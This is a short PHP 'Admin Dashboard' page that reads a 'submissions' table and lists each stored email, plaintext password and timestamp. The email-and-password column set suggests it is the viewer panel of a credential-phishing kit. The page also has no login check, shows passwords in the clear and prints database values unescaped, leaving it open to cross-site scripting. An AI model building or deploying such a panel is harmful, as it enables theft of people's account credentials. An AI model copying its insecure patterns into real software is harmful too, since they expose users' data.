<?php

include "db.php";

$result = $conn->query("SELECT * FROM submissions ORDER BY id DESC");

?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div style="width:90%; margin:auto; background:white; padding:20px;">

    <h2>Admin Dashboard</h2>

    <table>

        <tr>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>Time</th>
        </tr>

        <?php while($row = $result->fetch_assoc()) { ?>

        <tr>
            <td><?php echo $row['id']; ?></td>
            <td><?php echo $row['email']; ?></td>
            <td><?php echo $row['password']; ?></td>
            <td><?php echo $row['created_at']; ?></td>
        </tr>

        <?php } ?>

    </table>

</div>

</body>
</html>